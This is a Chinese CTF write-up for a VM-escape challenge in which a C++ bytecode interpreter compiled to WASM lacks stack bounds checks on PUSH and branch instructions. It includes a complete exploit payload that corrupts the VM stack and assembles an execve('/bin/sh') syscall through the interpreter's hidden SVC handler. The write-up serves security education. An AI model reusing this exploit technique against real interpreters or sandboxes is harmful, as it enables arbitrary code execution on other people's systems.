# wm_eat_some_qanux

## 题目简述

程序实现了一个 VM，源码使用 C++ 编写并编译成 WASM，再通过 `wasmtime run --allow-precompiled ./out.cwasm` 运行。VM 接受类 ARM64 汇编输入，例如 `add x1, x1, #0`，内部有 `ADD`、`LDR`、`PUSH`、`BL`、`BEQ`、`RET`、`SVC` 等 opcode。

漏洞出现在 `PUSH` 和 `BL` / `BEQ` / `BNE` / `BLO` / `BHI` 等会保存返回地址的跳转中：源码每次 `SP += 8` 后直接写 `stack_m + SP`，没有做有效边界检查。`PUSH` 分支只检查 `registers[SP] + 1 == 1024 * 1024`，但栈指针按 8 字节增长，等值判断无法阻止越界；条件跳转分支甚至没有这个检查。

汇编器会把用户直接输入的 `svc` 替换成 `NOP` 并输出 `NO WAY!!!`，所以不能直接写 `svc`。利用思路是通过栈指针越界破坏 VM 执行上下文，让解释器执行内部 SVC opcode，从而调用 `syscall(registers[10], registers[11], registers[12], registers[13])`。

## 解题过程

exp

```assembly
add x1, x1, #0
cmp x30, x31
beq 1
push x1
push x1
push x1
push x1
push x1
push x1
push x1
add x2, x2, #0xfd
lsl x2, #12
add x2, x2, #0x8d0
push x2
add x3, x3, #0x9
lsl x3, #12
add x3, x3, #0x821
lsl x3, #12
add x3, x3, #0x70
push x3
push x4
sub x10, x10, x10
sub x11, x11, x11
sub x12, x12, x12
sub x13, x13, x13
add x10, x10, #0x3b
add x11, x11, #0x687
lsl x11, #12
add x11, x11, #0x32f
lsl x11, #12
add x11, x11, #0x6e6
lsl x11, #12
add x11, x11, #0x962
lsl x11, #8
add x11, x11, #0x2f
b 36
svc
EOF
```

利用思路是先通过条件跳转和多次 `push` 操作操控 VM 内部栈，再构造寄存器状态，使执行流落到内部 `SVC` 分支。payload 中用 `add`、`lsl`、`sub` 逐步拼出系统调用号和参数；`SVC` 分支还会检查编码里的 `verify1 == 0x70` 与 `verify3 == 0x21`，因此 payload 中也要让最终落到的指令满足这两个校验。

## 方法总结

- 核心技巧：自定义 VM 的栈指针越界，借类 ARM64 指令序列构造 `svc` 调用。
- 识别信号：VM 题里 `bl`、`beq` 等跳转指令会隐式保存返回地址时，应检查保存位置是否做了栈边界检查。
- 复用要点：类指令 VM 的 exploit 不一定需要直接写 shellcode，常见路线是利用解释器已有指令拼寄存器、控栈并触发解释器实现的 syscall 指令。
